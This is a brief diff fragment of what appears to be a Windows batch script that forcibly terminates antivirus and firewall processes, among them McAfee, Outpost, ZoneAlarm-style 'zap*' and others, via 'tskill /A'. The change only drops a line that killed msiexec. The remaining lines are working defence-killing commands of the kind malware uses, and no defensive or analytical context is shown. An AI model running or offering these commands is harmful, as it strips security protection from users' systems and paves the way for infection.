@@ -167,7 +167,6 @@ tskill /A msmp*
 cls
 tskill /A mcafe*
 tskill /A mghtml
-tskill /A msiexec
 tskill /A outpost
 tskill /A isafe
 tskill /A zap*cls
